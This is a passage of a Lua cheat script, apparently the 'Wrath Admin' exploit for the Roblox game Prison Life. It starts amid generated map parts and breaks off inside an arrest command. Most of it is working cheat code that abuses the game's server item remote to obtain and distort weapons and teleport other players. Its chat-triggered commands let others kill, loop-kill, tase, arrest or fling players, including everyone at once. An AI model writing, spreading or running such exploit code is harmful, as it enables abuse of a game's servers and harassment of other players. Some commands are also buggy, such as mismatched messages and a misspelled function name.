        Part669.Size = Vector3.new(0.09999990463256836, 2.200000047683716, 16.200000762939453)
        Part669.Anchored = true
        Part669.BottomSurface = Enum.SurfaceType.Smooth
        Part669.BrickColor = BrickColor.new("White")
        Part669.Material = Enum.Material.SmoothPlastic
        Part669.TopSurface = Enum.SurfaceType.Smooth
        Part669.brickColor = BrickColor.new("White")
        Part670.Parent = Model0
        Part670.CFrame = CFrame.new(-15.6500034, 11855.7002, -19.0999908, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part670.Position = Vector3.new(-15.650003433227539, 11855.7001953125, -19.099990844726562)
        Part670.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part670.Size = Vector3.new(2.499998092651367, 3.499999761581421, 2)
        Part670.Anchored = true
        Part670.BottomSurface = Enum.SurfaceType.Smooth
        Part670.BrickColor = BrickColor.new("Mid gray")
        Part670.Material = Enum.Material.Cobblestone
        Part670.TopSurface = Enum.SurfaceType.Smooth
        Part670.brickColor = BrickColor.new("Mid gray")
        Part671.Parent = Model0
        Part671.CFrame = CFrame.new(-14.4500027, 11856.2002, -16.3999939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part671.Position = Vector3.new(-14.450002670288086, 11856.2001953125, -16.399993896484375)
        Part671.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part671.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part671.Anchored = true
        Part671.BottomSurface = Enum.SurfaceType.Smooth
        Part671.BrickColor = BrickColor.new("Really black")
        Part671.Material = Enum.Material.SmoothPlastic
        Part671.TopSurface = Enum.SurfaceType.Smooth
        Part671.brickColor = BrickColor.new("Really black")
        Part672.Parent = Model0
        Part672.CFrame = CFrame.new(-16.9500027, 11855.7998, -24.0999908, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part672.Position = Vector3.new(-16.950002670288086, 11855.7998046875, -24.099990844726562)
        Part672.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part672.Size = Vector3.new(0.09999990463256836, 3.6999998092651367, 12)
        Part672.Anchored = true
        Part672.BottomSurface = Enum.SurfaceType.Smooth
        Part672.BrickColor = BrickColor.new("Mid gray")
        Part672.Material = Enum.Material.Cobblestone
        Part672.TopSurface = Enum.SurfaceType.Smooth
        Part672.brickColor = BrickColor.new("Mid gray")
        Part673.Parent = Model0
        Part673.CFrame = CFrame.new(-20.5000019, 11853.9502, -24.1499939, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part673.Position = Vector3.new(-20.500001907348633, 11853.9501953125, -24.149993896484375)
        Part673.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part673.Size = Vector3.new(7, 0.19999995827674866, 12.100000381469727)
        Part673.Anchored = true
        Part673.BottomSurface = Enum.SurfaceType.Smooth
        Part673.BrickColor = BrickColor.new("Dark stone grey")
        Part673.Material = Enum.Material.Concrete
        Part673.TopSurface = Enum.SurfaceType.Smooth
        Part673.brickColor = BrickColor.new("Dark stone grey")
        Part674.Parent = Model0
        Part674.CFrame = CFrame.new(-6.89999962, 11867.1504, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part674.Position = Vector3.new(-6.899999618530273, 11867.150390625, 22.549999237060547)
        Part674.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part674.Size = Vector3.new(0.19999989867210388, 1, 19.100000381469727)
        Part674.Anchored = true
        Part674.BottomSurface = Enum.SurfaceType.Smooth
        Part674.BrickColor = BrickColor.new("Dark stone grey")
        Part674.Material = Enum.Material.SmoothPlastic
        Part674.TopSurface = Enum.SurfaceType.Smooth
        Part674.brickColor = BrickColor.new("Dark stone grey")
        Part675.Parent = Model0
        Part675.CFrame = CFrame.new(-6.85000038, 11866.1504, 22.5499992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part675.Position = Vector3.new(-6.850000381469727, 11866.150390625, 22.549999237060547)
        Part675.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part675.Size = Vector3.new(0.09999990463256836, 1, 19.100000381469727)
        Part675.Anchored = true
        Part675.BottomSurface = Enum.SurfaceType.Smooth
        Part675.BrickColor = BrickColor.new("Dark stone grey")
        Part675.Material = Enum.Material.SmoothPlastic
        Part675.TopSurface = Enum.SurfaceType.Smooth
        Part675.brickColor = BrickColor.new("Dark stone grey")
        Part676.Parent = Model0
        Part676.CFrame = CFrame.new(-15.5000057, 11853.9502, 22.6000099, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part676.Position = Vector3.new(-15.500005722045898, 11853.9501953125, 22.60000991821289)
        Part676.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part676.Size = Vector3.new(17, 0.19999995827674866, 19)
        Part676.Anchored = true
        Part676.BottomSurface = Enum.SurfaceType.Smooth
        Part676.BrickColor = BrickColor.new("Dark stone grey")
        Part676.Material = Enum.Material.Concrete
        Part676.TopSurface = Enum.SurfaceType.Smooth
        Part676.brickColor = BrickColor.new("Dark stone grey")
        Part677.Parent = Model0
        Part677.CFrame = CFrame.new(-20.7000027, 11853.9502, 5.60001087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part677.Position = Vector3.new(-20.700002670288086, 11853.9501953125, 5.600010871887207)
        Part677.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part677.Size = Vector3.new(6.599999904632568, 0.19999995827674866, 15)
        Part677.Anchored = true
        Part677.BottomSurface = Enum.SurfaceType.Smooth
        Part677.BrickColor = BrickColor.new("Dark stone grey")
        Part677.Material = Enum.Material.Concrete
        Part677.TopSurface = Enum.SurfaceType.Smooth
        Part677.brickColor = BrickColor.new("Dark stone grey")
        Part678.Parent = Model0
        Part678.CFrame = CFrame.new(-15.8500042, 11855.7002, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part678.Position = Vector3.new(-15.850004196166992, 11855.7001953125, 13.05001163482666)
        Part678.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part678.Size = Vector3.new(2.9000000953674316, 3.499999761581421, 0.10000000149011612)
        Part678.Anchored = true
        Part678.BottomSurface = Enum.SurfaceType.Smooth
        Part678.BrickColor = BrickColor.new("Mid gray")
        Part678.Material = Enum.Material.Cobblestone
        Part678.TopSurface = Enum.SurfaceType.Smooth
        Part678.brickColor = BrickColor.new("Mid gray")
        Part679.Parent = Model0
        Part679.CFrame = CFrame.new(-17.3500042, 11855.7002, 11.6000109, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part679.Position = Vector3.new(-17.350004196166992, 11855.7001953125, 11.600010871887207)
        Part679.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part679.Size = Vector3.new(0.09999990463256836, 3.499999761581421, 3)
        Part679.Anchored = true
        Part679.BottomSurface = Enum.SurfaceType.Smooth
        Part679.BrickColor = BrickColor.new("Mid gray")
        Part679.Material = Enum.Material.Cobblestone
        Part679.TopSurface = Enum.SurfaceType.Smooth
        Part679.brickColor = BrickColor.new("Mid gray")
        Part680.Name = "Grass"
        Part680.Parent = Model0
        Part680.CFrame = CFrame.new(0, 11853.7998, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part680.Position = Vector3.new(0, 11853.7998046875, 0)
        Part680.Color = Color3.new(0.172549, 0.396078, 0.113725)
        Part680.Size = Vector3.new(250, 0.10000000149011612, 250)
        Part680.Anchored = true
        Part680.BottomSurface = Enum.SurfaceType.Smooth
        Part680.BrickColor = BrickColor.new("Parsley green")
        Part680.Material = Enum.Material.Grass
        Part680.TopSurface = Enum.SurfaceType.Smooth
        Part680.brickColor = BrickColor.new("Parsley green")
        for i, v in pairs(mas:GetChildren()) do
            v.Parent = workspace
            pcall(
                function()
                    v:MakeJoints()
                end
            )
        end
        mas:Destroy()
        for i, v in pairs(cors) do
            spawn(
                function()
                    pcall(v)
                end
            )
        end
    
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20.500293731689453, 11865.7998046875, -24.149545669555664)
    end
    if CMD("ad") or CMD("script") or CMD("flex") then
        Chat("Wrath Admin is better than your script! Made by Zyrex and being Developed by Dis and Midnight! It has 228 Commands and more coming!");
    end
    if CMD("nspawn") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(875.02471923828, 27.789987564087, 2348.7604980469));
            Notify("Success", "Teleported " .. Player.Name .. " to neutral spawn.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("mcw") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-926.08154296875, 94.1287612915039, 1990.0577392578125));
            Notify("Success", "Teleported " .. Player.Name .. " to middle criminal wharehouse.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("lcw") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-931.4274291992188, 94.1287612915039, 1916.49951171875));
            Notify("Success", "Teleported " .. Player.Name .. " to last criminal wharehouse.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("sew") or CMD('sewer') or CMD("swr") then -- real one
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(917.669921875, 78.69767761230469, 2428.47265625));
            Notify("Success", "Teleported " .. Player.Name .. " to sewer.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("scorp") or CMD('dumpster') then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(365.445374, 10.7605114, 1100.21265));
            Notify("Success", "Teleported " .. Player.Name .. " to dumpster.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("toilet") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(960.3410034179688, 101.33023071289062, 2476.3984375));
            Notify("Success", "Teleported " .. Player.Name .. " to toilet.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("snack") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(949.2426147460938, 101.42890930175781, 2340.570556640625));
            Notify("Success", "Teleported " .. Player.Name .. " to vending machine.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("trash") or CMD("scorpb") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(909.3489990234375, 100.31389617919922, 2286.896484375));
            Notify("Success", "Teleported " .. Player.Name .. " to trash.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("flag") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(724.799255, 129.352875, 2518.14087));
            Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("rb") then
        States.Rb = true
        Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
    end
    if CMD("unrb") then
        States.Rb = false
        Notify("Success", "Teleported " .. Player.Name .. " to flag.", 2);
    end
    if CMD("rgb") then
        States.Rgb = true; 
        Notify("Success", "Rgb is on.", 2);
    end
    if CMD("unrgb") then
        States.Rgb = false;
        Notify("Success", "Rgb is off.", 2);
    end
    if CMD("getteam") then
        if Args[2] == nil then
			local GetTeam = LocalPlayer.TeamColor.Name
            Notify("Success", "Your team is " .. GetTeam .. ".", 2);
		else
			local Player = GetPlayer(Args[2], LocalPlayer)
			if Player then
        	    local GetTeam = Player.TeamColor.Name
        	    Notify("Success", Player.Name .. "'s team is " .. GetTeam .. ".", 2);
        	else
        	    Notify("Error", Args[2] .. " is not a valid player.", 2);
			end
        end
    end
    if CMD("pp") then
        GiveGuns()
        if CheckOwnedGamepass() then
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M4A1.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
			pcall(function()
                WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
            end)
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
            wait()
            game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 5.2)
            game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 7.6)
            game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 17.5)
            game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 12.8)
            game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
            game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, 2.5, -1.5)
            wait()
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            wait()
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    else
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 4.5)
        game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(1.4, 2, 6.8)
        game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 11)
        game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 12)
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, 1.8, -1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    end
    end
    if CMD("megatower") then
        GiveGuns()
        if CheckOwnedGamepass() then
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M4A1.ITEMPICKUP)
            workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				pcall(function()
                    WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
                end)
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
            wait()
            game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
            game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2)
            game.Players.LocalPlayer.Character.M4A1.GripPos = Vector3.new(0.9, 2, 11)
            game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 7)
            game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
            game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -16, 1.5)
            game.Players.LocalPlayer.Character.Hammer.GripRight = Vector3.new(1, 0, 0)
            wait()
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("Tool") then
                    v.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            wait()
            game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.M4A1.Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
            game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
    else
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				pcall(function()
                    WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
                end)
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
        game.Players.LocalPlayer.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2)
        game.Players.LocalPlayer.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 7)
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -12, 1.5)
        game.Players.LocalPlayer.Character.Hammer.GripRight = Vector3.new(1, 0, 0)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.M9.Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["AK-47"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelisteItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
    end
    if CMD("sharp") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single["Crude Knife"].ITEMPICKUP)
        game.Players.LocalPlayer.Backpack["Crude Knife"].Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character["Crude Knife"].GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character["Crude Knife"].GripPos = Vector3.new(1.4, 1.5, 1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack["Crude Knife"].Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelisteItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Crude Knife"))
        end)
    end
    if CMD("pph") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single.Hammer.ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, 1, -110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(1.5, 1.8, -1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
    if CMD("mh") then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        game:GetService("Workspace").Remote.ItemHandler:InvokeServer(game:GetService("Workspace").Prison_ITEMS.single.Hammer.ITEMPICKUP)
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character.Hammer.GripUp = Vector3.new(1, -0.1, 110)
        game.Players.LocalPlayer.Character.Hammer.GripPos = Vector3.new(0.9, -1, 1.5)
        wait()
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = game.Players.LocalPlayer.Backpack
            end
        end
        wait()
        game.Players.LocalPlayer.Backpack.Hammer.Parent = game.Players.LocalPlayer.Character
        pcall(function()
            WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
        end)
    end
end


function RandomPlayer()
    local PlayersTable = Players:GetPlayers();
    local RandomIndex = math.random(1, #PlayersTable);
    return PlayersTable[RandomIndex];
end;

function RandomTeam()
    local Teams = {"guards", "inmates", "criminals"};
    return Teams[math.random(1, #Teams)];
end;

--// Ranked Commands:
function UseRankedCommands(MESSAGE, Admin)
    if Admin == LocalPlayer then
        return
    end;
    local Args = MESSAGE:split(" ");

    if not Args[1] then 
        return
    end;

    if Args[1] == "/e" then
        table.remove(Args, 1);
    end;

    if Args[1] == "/w" then
        table.remove(Args, 1)
        if Args[2] then
            table.remove(Args, 1);
        end; 
    end;

    if Args[1]:sub(1, 1) ~= Settings.Prefix then
        return
    end;

    local CommandName = Args[1]:sub(2);
    local PF = Settings.Prefix;
    
    local function CMD2(NAME)
        return NAME == CommandName:lower();
    end;

    local function WarnProtected(Admin, Player, CMD)
        Chat("/w " .. Admin.Name .. " " .. Player.Name .. " is protected from that command!");
        Chat("/w " .. Player.Name .. " " .. Admin.Name .. " tried to use " .. Settings.Prefix .. CMD .. " on you.");
    end;

    local function WarnDisabled(CMD)
        Chat("/w " .. Admin.Name .. " " .. Settings.Prefix .. CMD .. " is disabled right now.");
    end;

    local function NotAValidPlayer(CMD)
        Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. CMD .. " " .. RandomPlayer().Name:lower() .. " or " .. PF .. CMD .. " me");
    end;

    if CMD2("cmds") or CMD2("cmd") then
        Chat("/w " .. Admin.Name .. " " .. PF .. "kill [plr,inmates,guards,criminals,all] " .. PF .. "lk [plr] " .. PF .. "unlk [plr] " .. PF .. "arrest [plr] " .. PF .. "crim [plr] " .. PF .. "fling [plr] " .. PF .. "sfling [plr] " .. PF .. "tase [plr,all] " .. PF .. "ctp [plr]");
        Chat("/w " .. Admin.Name .. " " .. PF .. "key [plr] " .. PF .. "shield [plr] " .. PF .. "shotty [plr] " .. PF .. "m9 [plr] " .. PF .. "m4 [plr] " .. PF .. "ak [plr] " .. PF .. "hammer [plr] " .. PF .. "knife [plr] " .. PF .. "handcuffs [plr] " .. PF .. "taser [plr]");
        Chat("/w " .. Admin.Name .. " " .. PF .. "nexus [plr] " .. PF .. "cafe [plr] " .. PF .. "tower [plr] " .. PF .. "yard [plr] " .. PF .. "cells [plr] " .. PF .. "back [plr] " .. PF .. "base [plr] " .. PF .. "crim [plr] " .. PF .. "bring [plr] " .. PF .. "oneshot [plr]");
        Chat("/w " .. Admin.Name .. " " .. PF .. "virus [plr] " .. PF .. "unvirus [plr] " .. PF .. "ka [plr] " .. PF .. "unka [plr] " .. PF .. "trap [plr] " .. PF .. "untrap [plr] " .. PF .. "void [plr] " .. PF .. "armory [plr] " .. PF .. "goto [plr] " .. PF .. "onepunch [plr]");
    end;
    if CMD2("kill") then
        if AdminSettings.killcmds == true then
            if Args[2] == "all" then
                KillPlayers(Players, Admin);
            elseif Args[2] == "inmates" then
                KillPlayers(Teams.Inmates, Admin);
            elseif Args[2] == "guards" then
                KillPlayers(Teams.Guards, Admin);
            elseif Args[2] == "criminals" then
                KillPlayers(Teams.Criminals, Admin);
            else
                local Player = GetPlayer(Args[2], Admin);
                if Player then
                    if CheckProtected(Player, "killcmds") or Player == Admin then
                        AddToQueue(function()
                            Kill({Player});
                        end);
                    else
                        WarnProtected(Admin, Player, "kill");
                    end;
                else
                    Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. "kill " .. RandomPlayer().Name:lower() .. " or " .. PF .. "kill " .. RandomTeam() .. " or " .. PF .. "kill all");
                end;
            end;
        else
            WarnDisabled("kill");
        end;
    end;
    if CMD2("tase") then
        if AdminSettings.killcmds == true then
            if Args[2] == "all" then
                Tase(Players:GetPlayers());
            else
                local Player = GetPlayer(Args[2], Admin);
                if Player then
                    if CheckProtected(Player, "killcmds") or Player == Admin then
                        AddToQueue(function()
                            Tase({Player});
                        end);
                    else
                        WarnProtected(Admin, Player, "tase");
                    end;
                else
                    Chat("/w " .. Admin.Name .. " " .. Args[2] .. " is not a valid player. Example - " .. PF .. "tase " .. RandomPlayer().Name:lower() .. " or " .. PF .. "tase all");
                end;
            end;
        else
            WarnDisabled("tase");
        end;
    end;
    if CMD2("lk") then
        if AdminSettings.killcmds == true then
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "killcmds") or Player == Admin then
                    AddToQueue(function()
                        Loopkilling[Player.UserId] = Player;
                    end);
                else
                    WarnProtected(Admin, Player, "lk");
                end;
            else
                NotAValidPlayer("lk");
            end;
        else
            WarnDisabled("lk")
        end;
    end;
    if CMD2("unlk") then
        local Player = GetPlayer(Args[2], Admin);
        if Player then
            AddToQueue(function()
                Loopkilling[Player.UserId] = nil;
            end);
        else
            NotAValidPlayer("unlk");
        end;
    end;
    if CMD2("arrest") then
        if AdminSettings.arrestcmds == true then
            SavePos();
            local Player = GetPlayer(Args[2], Admin);
            if Player then
                if CheckProtected(Player, "arrestcmds") or Player == Admin then
                    AddToQueue(function()
                        Arrest(Player, 1);
                    end);
                else
                    WarnProtected(Admin, Player, "arrest");
                end;
            else
                NotAValidPlayer("arrest");
            end;
            task.wait(0.15);
